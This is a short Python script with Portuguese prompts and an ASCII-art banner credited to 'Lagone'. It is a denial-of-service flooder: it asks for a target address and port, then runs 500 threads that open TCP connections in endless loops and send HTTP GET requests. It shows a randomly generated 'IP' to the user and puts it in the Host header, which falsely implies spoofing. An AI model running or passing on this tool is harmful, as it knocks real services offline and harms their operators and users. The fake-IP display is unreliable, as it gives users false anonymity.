
logo =  ('''\033[1;31m

⠀⠀⠀⠀⠀⠀                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠙⣻⣷⣶⣤⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠋⠀⠀⠀⠀⢹⣿⣿⡟⠉⠉⠉⢻⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣇⠀⠀⠀⠈⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠉⠛⠿⣷⣤⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣶⣦⣤⣤⣀⣀⣀⡀⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⣿⣿⣿⠁⠀⠈⠙⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⠀⠀
⠀⠀⢿⣿⣿⣆⠀⠀⠀⠀⠈⠛⠿⣿⣶⣦⡤⠴⠀⠀⠀⠀⠀⣸⣿⣿⣿⡿⠀⠀
⠀⠀⠈⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁      𝒃𝒚: Lagone
\033[1;31m''')


import socket
import threading
import random
ip1 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])
ip2 = random.choice([1, 8, 7, 6, 5, 4, 3, 2, 9])
ip22 = random.choice([9, 8, 7, 6, 5, 4, 3, 2, 1])
ip11 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])

ipgerado = (f'182.21.{ip11}{ip22}.{ip1}{ip2}')



print (logo)

print (f'SEU IP GERADO: {ipgerado}')
try:

          alvo = input("\033[1;96m Endereço do alvo: \033[1;91m")
          porta = int(input("\033[1;96m porta do alvo: \033[1;91m"))
except ValueError as error:
	print ('''
	        Tente Novamente''')
	exit()
except KeyboardInterrupt as error:
	print ('script cancelado!')
	exit()
	      
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((alvo, porta))
        s.sendto(("GET /" + alvo + " HTTP/1.1\r\n").encode('ascii'), (alvo, porta))
        s.sendto(("Host: " + ipgerado + "\r\n\r\n").encode('ascii'), (alvo, porta))

        global attack_num
        attack_num += 1
        print(attack_num)
                       
        s.close()

for i in range(500):
      thread = threading.Thread(target=attack)
      thread.start()
    

